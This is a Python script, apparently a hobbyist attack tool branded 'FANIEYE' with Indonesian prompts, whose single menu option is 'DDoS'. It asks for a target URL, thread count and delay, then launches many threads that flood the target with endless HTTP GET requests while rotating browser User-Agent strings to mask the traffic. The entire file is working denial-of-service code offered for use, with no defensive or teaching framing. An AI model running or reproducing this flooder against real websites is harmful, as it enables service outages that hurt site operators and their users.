import threading
import requests
import time
import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
]

def attack(target_url, delay):
    while True:
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            response = requests.get(target_url, headers=headers)
            print(f"[+] Request sent! Status code: {response.status_code}")
        except Exception as e:
            print(f"[!] Error: {e}")
        time.sleep(delay)

def fanxiety_tool():
    print("""
    ███████╗ █████╗ ███╗   ██╗██╗███████╗██╗   ██╗███████╗
    ██╔════╝██╔══██╗████╗  ██║██║██╔════╝╚██╗ ██╔╝██╔════╝
    █████╗  ███████║██╔██╗ ██║██║█████╗   ╚████╔╝ █████╗  
    ██╔══╝  ██╔══██║██║╚██╗██║██║██╔══╝    ╚██╔╝  ██╔══╝  
    ██║     ██║  ██║██║ ╚████║██║███████╗   ██║   ███████╗
    ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝   ╚═╝   ╚══════╝
    """)
    print("1. DDoS")
    choice = input("Pilih opsi: ")

    if choice == "1":
        thread_count = int(input("\nMasukkan jumlah thread (contoh: 100): "))
        target_url = input("Masukkan URL target: ")
        delay = float(input("Masukkan delay (detik): "))
        
        print(f"\n[∆π] Memulai serangan ke {target_url} dengan {thread_count} thread...")
        
        for _ in range(thread_count):
            thread = threading.Thread(target=attack, args=(target_url, delay))
            thread.daemon = True
            thread.start()
        
        while True:
            time.sleep(1)
    else:
        print("[!] Opsi tidak valid!")

if __name__ == "__main__":
    fanxiety_tool()